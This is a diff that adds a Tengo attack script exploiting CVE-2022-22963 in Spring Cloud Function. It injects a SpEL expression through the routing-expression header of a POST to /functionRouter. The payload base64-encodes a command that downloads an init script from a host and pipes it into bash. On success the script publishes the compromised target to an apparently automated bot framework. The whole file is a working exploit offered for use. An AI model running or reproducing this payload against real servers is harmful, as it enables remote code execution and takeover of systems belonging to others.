@@ -1,0 +1,104 @@
+/*
+* This spring_cloud_rce_cve_2022_22963.tengo is an attack script that attacks target host by spring Cloud Function SPEL表达式注入漏洞
+* CVE-2022-22963
+*
+*global variable:
+*attackTarget
+*attackScript
+*/
+
+fmt  := import("fmt")
+http := import("http")
+text := import("text")
+attack := import("attack")
+base64 := import("base64")
+
+AttackName := "SpringCloudAttackCVE2022_22963"
+AttackType := "SpringCloudAttackCVE2022_22963"
+AttackInitScriptName := "init.sh"
+
+UA := "GoClient"
+timeoutMS := 10000
+
+host := attackTarget.ip
+port := attackTarget.port
+proto := attackTarget.proto
+
+isSSL := (proto == "https" ||port==443)
+client := http.newHttpClient(host,port,isSSL,timeoutMS)
+
+//make attack process and publish into attack tasks and send into sbot
+sendAttackResult := func() {
+
+    attackProcess := attack.newAttackProcess()
+    attackProcess.setIP(host)
+    attackProcess.setHost(host)
+    attackProcess.setPort(port)
+    attackProcess.setProto(isSSL?"https":"http")
+    attackProcess.setApp("SpringCloud")
+    attackProcess.setName(AttackName)
+    attackProcess.setType(AttackType)
+    attackProcess.setStatus(0)
+    attackProcess.setPayload("")
+    attackProcess.setResult("")
+    attackProcess.setDetails("")
+
+    //publish attack process into attack tasks
+    attackScript.pubProcess(attackProcess)
+}
+
+//make attack payload
+mkPayload := func() {
+
+    initUrl := attackScript.downloadInitUrl(host,port,AttackInitScriptName)
+    initDownloadCmd := attackScript.initCmdForLinux(initUrl,AttackType)
+
+    base64Cmd := base64.encode(initDownloadCmd)
+
+    pfmt := `T(java.lang.Runtime).getRuntime().exec("bash -c {echo,%s}|{base64,-d}|{bash,-i}")`
+
+    return fmt.sprintf(pfmt,base64Cmd)
+
+}
+
+doAttack := func() {
+
+    url := "/functionRouter"
+    payload := mkPayload()
+
+    request := http.newHttpRequest("post",url).addHeader("User-Agent",UA)
+    request.addHeader("Content-Type","application/text")
+    request.addHeader("spring.cloud.function.routing-expression",payload)
+
+    request.putString("cbot",false)
+    response := client.send(request)
+
+
+    if response.getStatusCode() !=500 {
+        return false
+    }
+
+    content := response.getBodyAsString()
+
+    if content == "" {
+        return false
+    }
+
+    if !text.contains(content,"{") ||!text.contains(content,"functionRouter") {
+
+        return false
+    }
+
+    return true
+}
+
+main := func(){
+
+    if doAttack() {
+
+        sendAttackResult()
+    }
+
+}
+
+main()
